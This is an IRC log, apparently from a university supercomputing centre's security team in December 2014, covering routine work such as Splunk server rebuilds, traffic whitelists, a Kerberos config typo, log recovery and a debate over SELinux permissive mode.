2014-12-04 17:13:54	jazoff	oh, I have something kind of generic that does that
2014-12-04 17:14:15	jazoff	but we could probably do something more specific if we wanted to
2014-12-04 17:14:24	soehlert	ok. adam promised that as part of the security model for this
2014-12-04 17:14:30	jazoff	ah
2014-12-04 17:14:38	soehlert	i can work on it if you dont have time, but i figured itd be a quick one for ya if you didnt have it already
2014-12-04 17:17:59	soehlert	just lemme know. im out for the night. later
2014-12-05 04:21:41	soehlert	jazoff: looks like we didn't get the topN today now..
2014-12-05 04:40:53	soehlert	also, just finished that puppet article. id be interested in seeing them compare salt, ansible, and puppet with hiera. it seems a lot of their issues with puppet were just that they had configs in their code which made things difficult to read and way too long. puppet seems like it meets their needs when he lays out the requirements.
2014-12-05 08:19:35	jazoff	soehlert: oh? i've been getting it now
2014-12-05 08:21:08	jazoff	the whitelist needs a lot of work
2014-12-05 08:48:19	jazoff	soehlert: did you find the topn report?
2014-12-05 10:25:21	soehlert	i still dont see todays
2014-12-05 10:26:22	jazoff	sent to security-alerts+topn
2014-12-05 10:28:02	soehlert	hmmm apologies. i do get it but there must be an old filter set up...i odnt know where it was, but it wasn't showing up in my inbox
2014-12-05 10:28:12	jazoff	:)
2014-12-05 10:28:20	jazoff	i added a bunch of things to the whitelist in the portal
2014-12-05 10:28:29	jazoff	should start getting smaller the more things I add
2014-12-05 10:28:34	jazoff	ideally the report should be mostly empty
2014-12-05 10:30:02	soehlert	cool
2014-12-05 10:43:28	jazoff	cisco is suing arista..
2014-12-05 10:43:30	jazoff	they must be scared
2014-12-05 10:46:37	eyrich	it looks like some of it might have merit
2014-12-05 10:53:57	soehlert	over what?
2014-12-05 10:56:31	jazoff	hurt feelings
2014-12-05 10:59:29	jazoff	"Cisco features that are not industry standards; marketing those features; promoting its ability to copy Cisco as a way of increasing Aristas value; and emboldening competitors to follow suit"
2014-12-05 10:59:43	jazoff	er, missed the "incorporating" at the beginning
2014-12-05 11:01:29	jazoff	http://blogs.cisco.com/news/protecting-innovation
2014-12-05 11:02:16	jazoff	mostly software patent BS
2014-12-05 11:02:39	soehlert	"protecting innovation" is a red flag these days. it basically means, they are innovating based off our ideas, and we don't like it.
2014-12-05 11:02:46	soehlert	we don't want to have to doooo stuff
2014-12-05 11:03:20	jazoff	cisco locks people in to cisco crap and complains when someone makes something compatible
2014-12-05 11:04:56	soehlert	i hate getting into politics but i dont think this is such a divisive thing to say....jesus we need some patent reform
2014-12-05 11:05:07	jazoff	yep
2014-12-05 11:21:33	soehlert	wardog: bernie owns the subnet, but never takes ownership of any hosts on it. be prepared for a long run around.
2014-12-05 11:22:57	wardog	I just blocked some of the systems, so. There's that.
2014-12-05 11:23:22	wardog	I miss being able to block at the building router....
2014-12-05 11:23:34	wardog	(on the campus net)
2014-12-05 11:26:10	soehlert	well they're in our building so that would suck!
2014-12-05 11:26:19	soehlert	but ya if we could block that whole net..
2014-12-05 11:26:46	wardog	On campus, the distribution WAS a subnet. Here, it's all edge.
2014-12-05 11:26:58	wardog	and, netdot!=netact
2014-12-05 11:27:26	soehlert	ahh and hah yes
2014-12-05 12:50:51	eyrich	we can still block entire nets, ACLs can be placed in the edge routers
2014-12-05 13:06:53	jazoff	https://twitter.com/NCSAatIllinois/status/540935937836855296
2014-12-05 13:07:03	jazoff	different protocols as long as they are both gridftp?
2014-12-05 13:28:10	soehlert	maybe they mean the machines use different than normal protocols?
2014-12-06 01:56:00	soehlert	saving for later https://github.com/bidord/pykek
2014-12-07 17:27:26	wardog	where do note messages from bro-dev go?
2014-12-07 17:27:30	wardog	notice
2014-12-08 00:52:23	soehlert	wardog: i think myself, jazoff, seth, and siwek last i checked
2014-12-08 00:52:43	soehlert	jazoff: what did splunk need to get going on the new machine?
2014-12-08 08:05:54	jazoff	soehlert: more disks, setup as raid 10
2014-12-08 08:48:59	wardog	Oh. hey, Justin is on site
2014-12-08 09:04:16	jazoff	yes
2014-12-08 09:49:06	wardog	no brocut on lowp?
2014-12-08 09:52:06	soehlert	no bro
2014-12-08 09:52:12	wardog	good point
2014-12-08 10:10:05	jazoff	ah, I have it in ~
2014-12-08 10:55:21	jschipp	if anyone is interested, lead developer of Sagan, a real-time log analysis engine,  will be speaking at OpenNSM today
2014-12-08 11:13:21	soehlert	jazoff: do you have any requests for partition layout of the raid volumes?
2014-12-08 11:13:31	eyrich	all to /
2014-12-08 11:13:32	eyrich	:)
2014-12-08 11:14:08	jazoff	i'd just have / and /opt for splunk
2014-12-08 11:16:00	soehlert	ok
2014-12-08 11:16:11	eyrich	hah - i was close
2014-12-08 11:16:50	soehlert	eyrich: sounds like you want to take over all admin duties.
2014-12-08 11:17:02	eyrich	funny
2014-12-08 11:17:05	soehlert	:)
2014-12-08 11:17:10	soehlert	i thought so
2014-12-08 14:31:29	wardog	Sam. For you. https://www.thinkgeek.com/product/htho/
2014-12-08 14:55:02	wardog	when were you guys going to do the network recabling?
2014-12-08 14:56:10	eyrich	part of it as part of the arista, the other part we need to know more about the NetEng switch upgrade, I think that was sort of waiting on Randy thinking about funding new hardware so the outage was short
2014-12-08 15:02:51	 *	jschipp walking
2014-12-08 15:37:50	soehlert	wardog: nice..
2014-12-08 15:38:04	soehlert	jazoff: were we going to do this on splunki or splunks?
2014-12-08 15:38:46	soehlert	err nvm the hw machines are both i..
2014-12-08 15:42:37	wardog	splunki1-sec and splunki2-sec. Just pick one to save and one to canabalize. :)
2014-12-08 15:44:45	soehlert	yup realized that. and ones already getting canabalized for cookoo as we speak
2014-12-08 15:46:53	wardog	sweet
2014-12-08 15:46:57	wardog	I bet Jon's happy.
2014-12-08 15:48:17	soehlert	with dual cpus and 96 gigs of ram he better be :)
2014-12-08 15:48:47	soehlert	though also we're at a point that if we are going to use more hw machines we might need to buy some ram
2014-12-08 15:49:08	wardog	ram's cheap.
2014-12-08 15:49:09	wardog	ish
2014-12-08 15:49:40	soehlert	ypu which is why id idnt feel too bad
2014-12-08 15:50:19	jschipp	win! thanks
2014-12-08 15:50:59	jschipp	I can't wait to get started on that, been waiting like 6 months :)
2014-12-08 15:51:23	wardog	The same could be said for CIF.... <stares>
2014-12-08 15:52:10	wardog	jschipp: has wayland gotten any progress on a system for islet for the DF class?
2014-12-08 15:52:24	wardog	I was wondering, if instead, you pilot it with Engineering Workstation Lab
2014-12-08 15:54:24	jschipp	wardog: CIF is practically done, I've actually brought the servers up for that: cif-client.ncsa.illinois.edu, cif-router-sec.ncsa.illinois.edu, and cif-database-sec.ncsa.illinois.edu
2014-12-08 15:54:38	jschipp	today I mean
2014-12-08 15:55:00	wardog	nice.
2014-12-08 15:55:02	jschipp	wardog: should be done today
2014-12-08 15:55:23	wardog	Just in time for cuckoo!
2014-12-08 15:55:46	jschipp	wardog: I haven't heard anything about it from Wayland, I'll ask him tonight
2014-12-08 15:55:53	jschipp	lol
2014-12-08 15:56:54	wardog	Well, might as well start the DNS requests, unless you did that already.
2014-12-08 15:58:12	soehlert	jschipp: and maybe kill those splunki alerts while you're at it. those hosts are gone.
2014-12-08 15:58:39	wardog	I'll let cites know to drop those from the license pool and expect splunks-sec
2014-12-08 16:02:24	soehlert	jazoff: whats the hostname for this one going to be? do we need to remove the old dns entries and get a new one?
2014-12-08 16:05:40	wardog	splunks-sec is what we settled on. But I think it should just be splunk-sec.
2014-12-08 16:06:14	jschipp	wardog: I did that already
2014-12-08 16:07:37	wardog	excellent. carry on...
2014-12-08 16:08:10	wardog	jschipp: can you be free next Monday around 3:30?
2014-12-08 16:08:34	jschipp	sure
2014-12-08 16:08:36	wardog	to show off islet.
2014-12-08 16:08:49	jschipp	yeah, can you send me a cal invite?
2014-12-08 16:08:55	wardog	yeah.
2014-12-08 16:09:32	wardog	Actually, everyone. You'll notice that Randy threw a meeting up on your calendars for tomorrow. It's an informal meeting to just get ideas from everyone.
2014-12-08 16:10:14	soehlert	ya...about that.
2014-12-08 16:18:27	soehlert	eyrich: do oyu remember how to get into the firmware update stuff?
2014-12-08 16:18:46	eyrich	nope - i thought it was just to boot of the USB key
2014-12-08 16:19:37	soehlert	hmm ok i thought it was in bios somewhere ill try that
2014-12-08 16:20:04	soehlert	youre right
2014-12-08 16:50:25	jazoff	traffic to 80.248.65.183
2014-12-08 16:50:35	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-12-08 16:50:38	jazoff	yay
2014-12-08 21:13:16	wardog	https://community.qualys.com/blogs/securitylabs/2014/12/08/poodle-bites-tls
2014-12-08 22:48:53	soehlert	oh man just saw jeremy's email. if we could get rid of keepas and move them into a shared lastpass. that would be AMAZING
2014-12-09 11:02:24	eyrich	qualys scan for fog and dew are ugly
2014-12-09 11:02:56	wardog	?
2014-12-09 11:03:00	wardog	credentialed?
2014-12-09 11:03:03	eyrich	yes
2014-12-09 11:03:06	soehlert	what kinda ugly?
2014-12-09 11:03:38	eyrich	level 5 kind of ugly - at least 4 shellshocl related
2014-12-09 11:03:58	eyrich	not suprisiing is it, since we are no longer getting RHEL updates right?
2014-12-09 11:04:20	soehlert	hmm no i guess not
2014-12-09 11:04:31	soehlert	i was thinking we had a license for them, but its cerb and bwbh
2014-12-09 12:01:09	soehlert	jazoff: having a hell of a time getting hardware raid going like this. during the installer all you have access to is software raid. i think i got an idea though. gonna try it out after i finish eating.
2014-12-09 12:01:46	jazoff	you should just see one giant disk
2014-12-09 12:04:21	soehlert	i mean i cant get it set up via the install. but i think i figured out how to set it during kickstart so i'll just have to create a kickstart file for this. probably better that way anywys
2014-12-09 12:07:38	jazoff	you mean setup the raid10? you would do that in the bios
2014-12-09 12:08:28	soehlert	well thats what i thought, but i didnt see it in there
2014-12-09 12:08:49	soehlert	but ya i guess i have to for hw dont i?
2014-12-09 12:08:49	soehlert	shit..
2014-12-09 12:18:26	wardog	There isn't a raid menu post post?
2014-12-09 12:18:41	jschipp	soehlert: seclogs' /usr/local volume is full
2014-12-09 12:18:50	wardog	Is it a perc controller?
2014-12-09 12:19:19	wardog	er... that's not good.
2014-12-09 12:19:33	jazoff	perc is dell (PE = power edge)
2014-12-09 12:19:45	wardog	oh, these are the HPs, right.
2014-12-09 12:23:32	jazoff	yeah
2014-12-09 12:24:30	wardog	oh... The online hp lookup tool does have us extended to Feb 29th, 2016
2014-12-09 12:27:18	wardog	I guess HP calls them ACU? Array Configuration Utility
2014-12-09 12:28:00	wardog	press F5 during post.
2014-12-09 12:37:18	jschipp	volume has been full since Nov 16th, so we're missing logs on seclogs since then. Nagios sent as an alert on the 15th but it must have been overlooked. I'm moving the logs for Nov to archive/2014/11 for now so that the system can be begin logging again
2014-12-09 12:37:19	soehlert	F5 is not an option during post
2014-12-09 12:38:29	soehlert	jschipp: that's really strange. i dont know why it wasnt rotating properly
2014-12-09 12:43:26	jschipp	on the bright side they'll still be in splunk :) 
2014-12-09 12:48:19	jschipp	it'll take a while to copy, heading to lunch with jazoff 
2014-12-09 12:58:00	soehlert	oh cool. apparently the newest firmware has issues. that's why i couldnt get to it.
2014-12-09 13:06:14	soehlert	jschipp: is there a check we could set up in nagios for seclogs that looks to see if there are logs older than three days on it? that way we can see if rotation is working or not
2014-12-09 13:39:51	jschipp	soehlert: not aware of anything existing but I could write one
2014-12-09 13:40:53	jschipp	are splunk-sec and splunks-sec different? 
2014-12-09 13:42:12	jazoff	splunks-sec was the older one, if splunk-sec is new it is likely the replacement box
2014-12-09 13:42:17	soehlert	splunks doesnt exist. wardog wanted it to be named splunk
2014-12-09 13:42:44	jschipp	kk
2014-12-09 13:52:27	jschipp	I completed CIF yesterday, I think that was the last CentOS conversion task, marked it off the lists
2014-12-09 13:53:00	jschipp	I implemented it in HA mode where the router, database, and client or separate.
2014-12-09 13:54:41	jschipp	I created API keys for you all and you can query by logging into cif-client-sec.ncsa.illinios.edu and running cif -q <domain|feed|ip|etc>
2014-12-09 13:55:07	jazoff	jschipp: there's a ninfo plugin for cif so in theory no one ever has to use cif directly 
2014-12-09 13:55:07	jschipp	are*
2014-12-09 13:55:08	ncsabot	Error running plugin
2014-12-09 13:55:11	jazoff	sigh
2014-12-09 13:55:15	jschipp	lol
2014-12-09 13:55:30	jschipp	kk, well, it's available should they want to use it
2014-12-09 13:55:52	jazoff	does it have the old api keys still?
2014-12-09 13:55:58	jschipp	nope
2014-12-09 13:56:09	jazoff	ah. I need to fix the ninfo config then
2014-12-09 13:56:09	ncsabot	Error running plugin
2014-12-09 13:56:10	jazoff	sigh
2014-12-09 13:56:24	jazoff	also need to fix the plugin regex for that
2014-12-09 13:56:25	jschipp	log into cif-client-sec and grab your key
2014-12-09 13:56:33	jschipp	.cif
2014-12-09 13:57:16	jschipp	I'm going to try and create OSX packages for libcif so we can query from our desktops
2014-12-09 14:40:13	jschipp	jazoff: unless you want a new one for portal-sec
2014-12-09 14:41:43	jazoff	i just reused mine
2014-12-09 14:42:04	jazoff	but if you want to generate one for the portal i can use it. just stick it in puppet/modules/portal/files/ninfo.ini
2014-12-09 15:49:05	soehlert	ooo i like cif from here vs logging in
2014-12-09 17:07:49	jschipp	Is it just me or has reimbursment for staffdev funds been slower the past 6 months?
2014-12-10 09:52:21	wardog	anyone o the login issue from glick?
2014-12-10 09:52:30	wardog	on*
2014-12-10 09:56:11	jazoff	did a basic graph in splunk for just all ssh connections.. slight increase yesterday
2014-12-10 09:56:54	jazoff	but lemme do it better and actually filter for incoming
2014-12-10 10:04:14	jazoff	yeah.. big spike in ssh yesterday
2014-12-10 10:07:48	jazoff	most of the things got blocked by bro, so not sure what he was seeing specifically
2014-12-10 10:08:01	jazoff	saw one ip that didnt get blocked by bro since it was only hitting a few servers on the same subnet
2014-12-10 10:08:13	jazoff	which ossec would have blocked if we got logs from that system in theory
2014-12-10 10:59:07	soehlert	https://www.duosecurity.com/blog/introducing-role-based-access-controls-for-duo-administrators
2014-12-10 11:04:44	wardog	hmmm... Weren't we supposed to come up with a Duo management interface for CITES?
2014-12-10 11:06:09	jazoff	I had started one.. but needed access to the admin api..
2014-12-10 11:06:27	jazoff	and the last time we talked about it, that's what I told cites, and that was the last I heard
2014-12-10 11:07:27	wardog	who did you tell at cites?
2014-12-10 11:07:36	jazoff	Bob?
2014-12-10 11:07:38	jazoff	i think it was
2014-12-10 11:07:41	wardog	riiiight
2014-12-10 11:07:51	jazoff	duo seemed to not want to give access to the admin api
2014-12-10 11:16:30	wardog	bob says he got approval and sent you and larry (at CITES) info on getting your account access.
2014-12-10 11:16:38	wardog	activated
2014-12-10 11:16:52	jazoff	oh? odd. I had just been waiting on them this whole time
2014-12-10 11:17:05	jazoff	haven't heard anything about it in a long time
2014-12-10 11:17:33	wardog	np, he's checking. 
2014-12-10 11:19:19	jazoff	yeah, the last email I see was me asking about the admin account on Jul 24
2014-12-10 11:21:39	wardog	looks like bob never sent you the email. He's following up.
2014-12-10 11:30:20	jazoff	ah
2014-12-10 11:58:59	soehlert	jazoff: puppet runs now working again. splunk got installed
2014-12-10 11:59:33	jazoff	cool
2014-12-10 13:06:03	eyrich	im gettign this on isce 
2014-12-10 13:06:04	eyrich	fatal: Access denied for user qualys by PAM account configuration
2014-12-10 13:06:24	eyrich	thoughts on places to check?
2014-12-10 13:57:47	wardog	well, it's not authN. It's accepting the public key.
2014-12-10 13:59:22	soehlert	it was access.conf
2014-12-10 13:59:49	soehlert	also, jazoff reading through the "building a new bro server" thread on bro listserve I just keep thinking...dumbno!
2014-12-10 14:01:04	wardog	I see. The selinux enforcement?
2014-12-10 14:01:14	soehlert	huh?
2014-12-10 14:01:20	wardog	oh, thinking of something else.
2014-12-10 14:01:22	soehlert	no the /etc/security/access.conf file?
2014-12-10 16:22:26	jschipp	speaking of selinux, it seems like a good idea to have permissive mode enabled on our hosts so we at least get logs, without preventing actions
2014-12-10 17:05:05	wardog	These old Facebook dells are cheap: http://www.ebay.com/itm/Dell-CS24-SC-1U-Server-2x-Intel-L5420-Quad-Core-Xeon-2-5GHz-16GB-500GB-/121514134327?pt=COMP_EN_Servers&hash=item1c4ace8b37
2014-12-10 17:19:00	jschipp	wardog: where do you see that they were from Facebook?
2014-12-10 17:19:34	jschipp	for $150 I might buy one or 2
2014-12-10 17:39:13	wardog	jschipp: look up the model number. These things are custom dell jobs for facebook and have since been flushed out and put into the reseller market.
2014-12-10 17:39:38	wardog	I bought one to host a few things at home. Just remember, they sound like jet engines.
2014-12-10 18:10:11	jschipp	kk, thanks
2014-12-11 08:32:19	jazoff	hmm, can't ssh to repo-sec
2014-12-11 08:32:44	jazoff	hmm, or bro-dev.. something up with kerberos?
2014-12-11 09:03:50	jazoff	did 10.142.148.36 used to resolve?
2014-12-11 09:04:13	jazoff	kerberos works to hosts that are not on 10/8
2014-12-11 09:04:36	jazoff	though it may just be ssh rejecting it
2014-12-11 09:04:46	wardog	hmmm
2014-12-11 09:05:07	wardog	How do 10.142 hosts get out of the 10.142.148 net?
2014-12-11 09:05:28	wardog	I'm guessing a pfsense host
2014-12-11 09:05:40	jazoff	yeah
2014-12-11 09:05:53	jazoff	it's not timing out though, it's failing immediately
2014-12-11 09:05:55	wardog	Do we have monitoring for tha thost?
2014-12-11 09:05:57	jazoff	need to get sshd -D working
2014-12-11 09:07:46	jazoff	'Improper format of Kerberos configuration file'
2014-12-11 09:10:50	jazoff	[root@bro-dev ~]# klist
2014-12-11 09:10:51	jazoff	klist: Improper format of Kerberos configuration file while initializing krb5
2014-12-11 09:10:51	jazoff	idd
2014-12-11 09:10:53	jazoff	odd..
2014-12-11 09:11:05	jazoff	i wonder if it's just hosts in development that are having an issue and production hosts are ok
2014-12-11 09:12:02	jazoff	hmm
2014-12-11 09:12:03	jazoff	2014-12-10T12:57:41.510128-06:00 bro-dev puppet-agent[3895]: (/Stage[main]/Kerberos/File[/etc/krb5.conf]/content) content changed '{md5}619493ccdcdf09a7c0cf6fba978625d8' to '{md5}66462bc2e9220d9ec4a3664a6f73dc4b'
2014-12-11 09:12:45	eyrich	the sec pfs sense cluster sends flow logs to 141.142.148.20
2014-12-11 09:14:09	eyrich	syslogs sent to 141.142.148.91
2014-12-11 09:14:32	jazoff	ah, it has a typo
2014-12-11 09:14:33	jazoff	        ACM.UIUC.EDU = {
2014-12-11 09:14:33	jazoff	                kdc = kerberos.acm.uiuc.edu
2014-12-11 09:14:33	jazoff	        ACM.UIUC.EDU = {
2014-12-11 09:19:45	jazoff	all fixed
2014-12-11 09:39:52	eyrich	should we ask the BW admins to enable iptables ssh restrictions on isce?
2014-12-11 10:24:56	soehlert	oops. good catch jazoff
2014-12-11 10:38:55	jschipp	wardog: bought 5 of those machines last night lol
2014-12-11 11:11:40	soehlert	good lord. bw-outbox update. sonnexions dont have ftp so even though cray made ftp a requirement, it does us no good..
2014-12-11 11:11:49	jazoff	what DO they have?
2014-12-11 11:12:46	jschipp	the rc scripts for sshd are pissing me off, "openssh-daemon dead but pid file exist"
2014-12-11 11:13:03	soehlert	they want nfs (lolno) or scp..
2014-12-11 11:13:14	soehlert	jschipp: good im not alone there.
2014-12-11 11:14:29	jschipp	echo $PID > /var/run/sshd.pid will fix them, for some reason is doesn't have the right pid, i've been manually doing this as a quick fix
2014-12-11 11:14:56	jschipp	pidof sshd i mean
2014-12-11 11:24:45	jazoff	what pid does the file contain?
2014-12-11 11:36:49	jschipp	an old sshd pid
2014-12-11 11:37:16	jschipp	well, it's no longer running to verify but that's what I suspect
2014-12-11 12:15:14	jschipp	Thoughts on enabling permissive mode in selinux? I'm not aware of downside since it doesn't enfore and we'll get logs when things try to overstep their bounds that we wouldn't otherwise have
2014-12-11 12:15:22	jschipp	enforce*
2014-12-11 12:18:25	soehlert	what benefits are you expecting to see from it? i'm not necessarily against it, just want to make sure we have a real reason for it
2014-12-11 12:19:45	soehlert	i guess im curious if there's a good way to centralize those logs and make it easy to get to. i could see them being just noise is my concern
2014-12-11 12:20:16	soehlert	is there something going on that would be fixed by having these logs that you've seen?
2014-12-11 12:20:32	jschipp	more detailed logs especially wiht policies for apache, e.g. compromised webserver you can see what files were touched out of scope
2014-12-11 12:20:59	jschipp	it's never recommended to just turn it off
2014-12-11 12:21:21	jschipp	it's all about better detection
2014-12-11 12:21:33	soehlert	i know the possible upsides. but im having a hard time those ocassions are going to happen enough to make it worth the noise of the logs
2014-12-11 12:21:33	soehlert	and actually sans securing unix/linux suggested it if you aren't required by PII rules or something to not waste time with it
2014-12-11 12:22:27	jschipp	that sounds absurd to me, and when I reviewed that section I believe it said that the least you can do is have it in permissive mode
2014-12-11 12:22:59	jschipp	I'll double check though
2014-12-11 12:23:01	soehlert	is there a way we can pump those logs into splunk or ossec and make policies off them? i could maybe see if we could do that
2014-12-11 12:23:01	soehlert	and its what he said in person. we spent a day learning how to use selinux and he said its not much help and too much noise
2014-12-11 12:23:14	soehlert	cant remember what the book says but thats what hal said
2014-12-11 12:25:24	soehlert	id be interested in seeing it in splunk though
2014-12-11 12:26:02	jschipp	that's his opinion but I've seen a lot of talks on selinux e.g. OLF 2 months ago where the speaker said learn how to use, don't turn it off and made the point of at least having it in permissive mode because then you still have useful data to work with
2014-12-11 12:26:40	jschipp	I wonder what it would look like in splunk as well
2014-12-11 12:27:32	soehlert	i get the idea of that, but it sounds like it's great in theory but annoying in practice. and i think that was hal's point. selinux takes resources and doesn't give a lot of benefit usually. so thats why i think the book may not line up with what he said. 
2014-12-11 12:27:36	jschipp	I'm just thinking of having it in the standard log files where we can refer back if the need arises
2014-12-11 12:27:45	soehlert	theory vs reality
2014-12-11 13:21:06	eyrich	how do we white list - [sa] SEC: phalanx attempt 141.142.148.51
2014-12-11 13:23:15	soehlert	someone else should do it so i dont have my name atached to all the alerts :)
2014-12-11 13:23:20	soehlert	the sec configs are in puppet
2014-12-11 13:25:39	eyrich	soehlert: done, thanks
2014-12-11 13:28:46	soehlert	loogit you with all your git usage lately
2014-12-11 13:29:11	eyrich	just though, which branches do I  put it in?
2014-12-11 13:35:15	soehlert	probably needs to get to production to actually take hold
2014-12-11 13:35:38	eyrich	did that one and it wasnt in production-ncsa
2014-12-11 13:36:15	jschipp	regular production, not ncsa_production
2014-12-11 14:02:27	jschipp	wardog: Dimmu Borgir?
2014-12-11 14:02:29	jschipp	:)
2014-12-11 14:06:39	wardog	?
2014-12-11 14:06:45	wardog	what did I miss?
2014-12-11 14:06:59	wardog	ah, music?
2014-12-11 14:07:45	wardog	playing video game themes. Seeing if the hype is true about being able to concentrate better with gaming music in the background.
2014-12-11 14:10:01	jschipp	ah, sounded a lot like the symphonic black metal band Dimmu Borgir
2014-12-11 14:10:11	jschipp	one of the tracks did anyway
2014-12-11 14:10:33	wardog	quite possible. Probably the Gears of War theme.
2014-12-12 10:50:46	soehlert	so i'm lookin for ideas here. bw-outbox can't do anonymous ftp even though they said that was required, the sonnexions dont have ftp and apparenlty cant install it. they wanted to do nfs (adam and i agreed...no). so they said how bout scp. that works from a security stand point, but how do i allow them to log in?
2014-12-12 10:51:01	soehlert	its host key auth from the bastions but not the sonnexions
2014-12-12 10:51:29	jazoff	can a ssh key be added to the sonnexion?
2014-12-12 10:51:40	soehlert	its hundreds of machiens i do believe
2014-12-12 10:52:14	soehlert	and im not sure we can add anything to them
2014-12-12 10:52:19	jazoff	oh
2014-12-12 10:52:35	soehlert	otherwise adding ftp saves everyone a major headache
2014-12-12 10:52:56	soehlert	but seagate owns these and gets final say
2014-12-12 10:56:32	jazoff	can putbox PULL the files from them somehow?
2014-12-12 10:56:59	soehlert	hmm that's an interesting thought.
2014-12-12 11:00:16	soehlert	ya i wonder if we can get host key auth from outbox to the sonnexions
2014-12-12 11:08:47	jazoff	what protocols do they support?
2014-12-12 11:10:56	soehlert	they support scp is that what you're asking
2014-12-12 11:11:17	jazoff	well, and nfs :)
2014-12-12 11:11:22	soehlert	well yes
2014-12-12 14:04:35	wardog	Consdering buying a Burp Suite license for the office. Thoughts?
2014-12-12 14:04:54	soehlert	i would like to play with that
2014-12-12 14:07:05	jschipp	that would be cool, I've been wanting to play with the pro version
2014-12-15 08:40:19	jazoff	trying to make a dent in teh top talker whitelist...
2014-12-15 08:40:49	jazoff	one thing that is interesting is how many of the hosts that were whitelisted from day one are doing 2-10x more traffic than they were originally doing
2014-12-15 08:41:09	wardog	like which hosts?
2014-12-15 08:41:14	jazoff	bridge3.nas.nasa.gov 
2014-12-15 08:41:22	wardog	oh, remote systems.
2014-12-15 08:41:25	jazoff	which is likely to the hpss hosts which are also up
2014-12-15 08:42:39	jazoff	yeah.. it's many to one from gridftp, so no one host on our side does that much
2014-12-15 08:57:51	jazoff	wonder what nasa is doing.. every other day they xfer 15-20TB
2014-12-15 09:10:52	wardog	It would be awesome if, on the next trip to the moon they left a giant bullseye. Then they could have a dart gun on the space station that students around the world could use to try to hit the bullseye using different methods like orbital slingshot, etc.
2014-12-15 09:11:37	wardog	You could even have the kids design their own darts.
2014-12-15 09:12:10	wardog	self correcting. limited fuel. different propulsion methods.
2014-12-15 09:13:24	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-12-15 09:50:22	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-12-15 10:22:28	soehlert	WFH waiting for some xmas packages to arrive
2014-12-15 10:22:38	jazoff	:)
2014-12-15 10:23:00	jazoff	soehlert: did the archive log script that you ran on friday finish?
2014-12-15 10:23:30	soehlert	hmm forgot to check. one sec
2014-12-15 10:24:01	jazoff	i think it did, i think we are just missing the nov logs
2014-12-15 10:24:05	jazoff	are they just gone?
2014-12-15 10:24:08	soehlert	yup. it did
2014-12-15 10:24:18	soehlert	all of nov?
2014-12-15 10:24:26	jazoff	can you find it anywhere?
2014-12-15 10:24:33	soehlert	or just like half? cuz i think jon said we ran out of space about halfway through the month
2014-12-15 10:24:55	jazoff	it's not on lowp...
2014-12-15 10:25:07	soehlert	whats not on lowp?
2014-12-15 10:25:17	jazoff	oh, wait
2014-12-15 10:25:19	soehlert	whens the last day we have
2014-12-15 10:25:22	jazoff	i think it is on lowp, just in the wrong place
2014-12-15 10:25:48	soehlert	ya that's the stuff jon moved and he didnt realize how it was set up
2014-12-15 10:25:58	jazoff	ok, I should be able to clean that up
2014-12-15 10:26:03	soehlert	i see 11/(01-16) on lowp
2014-12-15 10:26:06	jazoff	yeah
2014-12-15 11:33:37	jazoff	lowp churning through all the bzips
2014-12-15 13:24:40	wardog	nom nom
2014-12-15 13:52:21	jazoff	all nomed out
2014-12-15 13:53:31	jazoff	ok, logs all fixed
2014-12-15 13:53:52	jazoff	72G recompressed down to 2.2G
2014-12-15 13:53:59	jschipp	:)
2014-12-15 13:54:45	jazoff	i think we can delete /data/syslogs/2014/11 but i will leave for a bit
2014-12-15 14:11:57	soehlert	woo well done jazoff 
2014-12-15 14:18:49	jazoff	might be able to export some of the lost logs from splunk
2014-12-15 14:19:57	jazoff	jschipp: were the logs being forwarded to splunk when the disk was full?
2014-12-15 14:22:52	jschipp	yes, by the relays
2014-12-15 14:23:16	jazoff	so there should be in there
2014-12-15 14:23:43	wardog	They didn't queue up going to seclogs until seclogs recovered?
2014-12-15 14:25:37	wardog	These are all based on malicious images, correct? http://seclists.org/fulldisclosure/2014/Dec/52
2014-12-15 14:26:11	jazoff	yeah
2014-12-15 14:28:59	soehlert	so just don't install images from unknown sources
2014-12-15 14:29:01	soehlert	?
2014-12-15 14:29:05	jazoff	yeah
2014-12-15 14:41:58	jazoff	exporting.. had to stop splunk
2014-12-15 14:43:04	jschipp	wardog: they didn't queue, the system accepted them because communication between the two rsyslog daemons was good
2014-12-15 14:44:11	jschipp	in other words the queuing isn't helpful for disk space issues
2014-12-15 14:44:57	wardog	Is that plain TCP or RELP?
2014-12-15 14:46:50	jschipp	both
2014-12-15 14:47:15	jschipp	relays{1,2} <-> seclogs is RELP though
2014-12-15 14:47:26	jschipp	relays{1,2} <-> cyclone is TCP
2014-12-15 14:47:42	jschipp	relays{1,2} <-> analysis is RELP
2014-12-15 15:23:31	jazoff	hah, stupid expedia
2014-12-15 15:23:38	jazoff	Welcome Back from Champaign
2014-12-15 15:23:54	jazoff	Still Wish You Were on Vacation?
2014-12-15 15:27:39	soehlert	haha jerk expedia
2014-12-15 15:27:57	soehlert	soo i got a bunch of emails about lastpass being expired and then extended and then cancelled..anyone else?
2014-12-15 15:33:30	jazoff	nope
2014-12-15 15:36:03	soehlert	thats weird. i dont use lastpass so it has to be related to work right?
2014-12-15 15:46:10	jazoff	are you marked as an admin or a contact maybe?
2014-12-15 15:47:29	soehlert	i doubt it. eyrich?
2014-12-15 15:47:38	eyrich	you are neither.
2014-12-15 15:47:45	eyrich	and I have not seen any of these messages.
2014-12-15 15:48:12	jazoff	soehlert: any chance they were phishing messages? 
2014-12-15 15:48:39	eyrich	all accounts on an enterprise account expire at same time, I renewed ours last week. we are good until 2016-jan-09
2014-12-15 15:52:23	jschipp	I received two of them
2014-12-15 15:54:31	soehlert	ya mine said that date too
2014-12-15 15:56:29	eyrich	strange
2014-12-15 15:56:36	eyrich	i guess as long as it keeps working :0
2014-12-15 15:56:38	eyrich	:)
2014-12-15 15:58:55	soehlert	yup. when it doesnt ill make sure to call you. presuming i don't notice until 4 in the morning.
2014-12-15 15:59:12	eyrich	nice
2014-12-15 15:59:18	eyrich	have you tested it?
2014-12-15 15:59:21	eyrich	today
2014-12-15 15:59:57	soehlert	ya it works fine
2014-12-15 16:00:01	eyrich	ok
2014-12-15 16:00:02	soehlert	for now
2014-12-16 05:48:42	soehlert	i'm not going to make it in today. i did something to my back and currently can only exist at a 45 degree angle. walking, sitting, laying are all out of the question..
2014-12-16 08:41:04	jazoff	grr, thought i had the top talker whitelist at a good point, looks like there is still a ton of stuff to add/increase
2014-12-16 10:22:30	jazoff	there, that should be better
2014-12-16 11:00:14	wardog	What's the status of the new splunk server?
